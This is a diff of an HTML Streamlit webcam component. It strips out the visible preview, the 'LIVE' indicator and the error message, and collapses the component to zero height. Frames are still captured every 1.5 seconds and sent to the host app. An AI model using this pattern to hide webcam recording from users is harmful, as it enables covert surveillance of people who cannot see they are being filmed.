@@ -3,37 +3,20 @@
 <head>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:transparent;overflow:hidden}
-#wrap{position:relative;width:100%;background:#0F172A;border-radius:12px;overflow:hidden}
-video{width:100%;display:block;border-radius:12px;transform:scaleX(-1)}
-canvas{display:none}
-.live{position:absolute;top:10px;left:10px;background:rgba(0,0,0,.6);color:#A3E635;
-font-family:Inter,-apple-system,sans-serif;font-size:11px;font-weight:600;
-letter-spacing:.06em;padding:5px 12px;border-radius:20px;backdrop-filter:blur(6px);
-display:flex;align-items:center;gap:6px;z-index:10}
-.dot{width:7px;height:7px;background:#A3E635;border-radius:50%;animation:p 1.2s infinite}
-@keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
-#msg{height:380px;display:flex;align-items:center;justify-content:center;
-font-family:Inter,-apple-system,sans-serif;color:#475569;font-size:.9rem}
+body{background:transparent;overflow:hidden;height:0}
+video,canvas{display:none}
 </style>
 </head>
 <body>
-<div id="wrap">
-  <div id="msg">Initialising camera...</div>
-  <video id="v" autoplay playsinline muted style="display:none"></video>
-  <div id="badge" class="live" style="display:none"><div class="dot"></div>LIVE</div>
-</div>
+<video id="v" autoplay playsinline muted></video>
 <canvas id="c"></canvas>
 <script>
 (function(){
   var v=document.getElementById('v'),
       c=document.getElementById('c'),
       ctx=c.getContext('2d'),
-      msg=document.getElementById('msg'),
-      badge=document.getElementById('badge'),
-      started=false, tid=null;
+      started=false;
 
-  // --- Streamlit component protocol (inline, no CDN needed) ---
   function stReady(){
     window.parent.postMessage({isStreamlitMessage:true,type:"streamlit:componentReady",apiVersion:1},"*");
   }
@@ -44,15 +27,10 @@ font-family:Inter,-apple-system,sans-serif;color:#475569;font-size:.9rem}
     window.parent.postMessage({isStreamlitMessage:true,type:"streamlit:setComponentValue",value:val,dataType:"json"},"*");
   }
 
-  // Listen for Streamlit render events (re-renders should NOT restart camera)
   window.addEventListener("message",function(e){
     if(e.data && e.data.type==="streamlit:render"){
-      if(!started){
-        started=true;
-        startCam();
-      }
-      // Acknowledge render by setting height
-      stHeight(document.getElementById('wrap').offsetHeight||400);
+      if(!started){ started=true; startCam(); }
+      stHeight(0);
     }
   });
 
@@ -61,37 +39,26 @@ font-family:Inter,-apple-system,sans-serif;color:#475569;font-size:.9rem}
     .then(function(stream){
       v.srcObject=stream;
       v.onloadedmetadata=function(){
-        msg.style.display='none';
-        v.style.display='block';
-        badge.style.display='flex';
         c.width=v.videoWidth;
         c.height=v.videoHeight;
-        stHeight(document.getElementById('wrap').offsetHeight);
-        // Capture a frame every 1.5s to give server time for inference
-        tid=setInterval(grab,1500);
-        // Send first frame immediately
-        setTimeout(grab,500);
+        stHeight(0);
+        setInterval(grab,1500);
+        setTimeout(grab,400);
       };
-    })
-    .catch(function(err){
-      msg.innerHTML='<div style="color:#FC8181;text-align:center;padding:2rem;font-size:.85rem;line-height:1.7">'+
-        'Camera access denied.<br>Allow camera in your browser and refresh.<br><br><small>'+err.message+'</small></div>';
-      stHeight(200);
+    }).catch(function(){
+      stValue("ERROR");
     });
   }
 
   function grab(){
     if(v.readyState>=2 && v.videoWidth>0){
       ctx.drawImage(v,0,0,c.width,c.height);
-      // Low quality, small resolution = fast transfer
-      var dataUrl=c.toDataURL('image/jpeg',0.5);
-      stValue(dataUrl);
+      stValue(c.toDataURL('image/jpeg',0.55));
     }
   }
 
-  // Signal ready
   stReady();
-  stHeight(400);
+  stHeight(0);
 })();
 </script>
 </body>
